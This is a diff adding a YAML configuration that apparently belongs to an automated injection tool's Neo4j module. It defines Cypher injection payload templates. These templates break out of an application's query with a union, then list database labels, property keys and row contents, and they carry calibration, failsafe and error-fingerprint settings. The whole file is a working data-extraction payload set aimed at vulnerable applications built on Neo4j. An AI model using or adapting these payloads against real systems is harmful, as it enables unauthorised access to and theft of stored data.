@@ -1,0 +1,115 @@
+vendor: Neo4j
+
+resource:
+ info: |
+  '' as A limit 0 union
+  match (n)
+  return distinct
+      '${lead}'
+      %2b '-'
+      %2b '${enclose_value_sql}'
+      %2b '-'
+      %2b '${enclose_value_sql}'
+      %2b '-'
+      %2b '${trail_sql}'
+
+ schema:
+  database: |
+   '' as A limit 0 union
+   match (n)
+   return distinct
+       '${lead}${enclose_value_sql}neo4j${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+       as A
+   ${limit}
+   union match (n:blah) return n
+
+  table: |
+   '' as A limit 0 union
+   call db.labels()
+   yield label
+   with label
+   ${limit}
+   return
+       '${lead}'
+       %2b reduce(
+           b = '',
+           n IN collect(label) |
+               b
+               %2b '${enclose_value_sql}'
+               %2b n
+               %2b '${separator_qte_sql}0${enclose_value_sql}'
+       )
+       %2b '${trail_sql}'
+       as A
+   union match (n:blah) return n
+
+  column: |
+   '' as A limit 0 union
+   match (n:${table})
+   with collect(keys(n)) as attr
+   unwind attr as r
+   with distinct r[0] as d
+   order by d
+   ${limit}
+   return
+       '${lead}'
+       %2b reduce(
+           b = '',
+           n in collect(d) |
+           b
+           %2b '${enclose_value_sql}'
+           %2b n
+           %2b '${separator_qte_sql}0${enclose_value_sql}'
+       )
+   %2b '${trail_sql}'
+   as A
+   union match (n:blah) return n
+
+  row:
+   query: |
+    '' as A limit 0 union
+    match (n:${table})
+    with distinct n
+    ${limit}
+    return
+        '${lead}'
+        %2b reduce(
+            b = "",
+            n in collect(n) |
+            b
+            %2b '${enclose_value_sql}'
+            %2b ${fields}
+            %2b '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+        )
+    %2b '${trail_sql}'
+    as A
+    union match (n:blah) return n
+   fields:
+    field: coalesce(n.${field.value}, '')
+    concat: "%2b '%7f' %2b"
+
+strategy:
+ configuration:
+  slidingWindow: ${injection}
+  limit: skip ${limit.value} limit 65536
+  failsafe: match (n) return 1337${indice}7330%2b1 as A
+  calibrator: |
+   '' as A limit 0 union
+   match (n)
+   return
+       '${lead}${indice}'
+       %2b reduce(
+           a = "",
+           nn in collect(n) |
+           a %2b "${calibrator_sql}"
+       )
+  limitBoundary: 0
+  endingComment: //
+  fingerprint:
+   errorMessage:
+    - neo4j
+
+ normal:
+  indices: return 'A' as A union ${indices}
+  capacity: ${calibrator}
+  orderBy: order by 1337
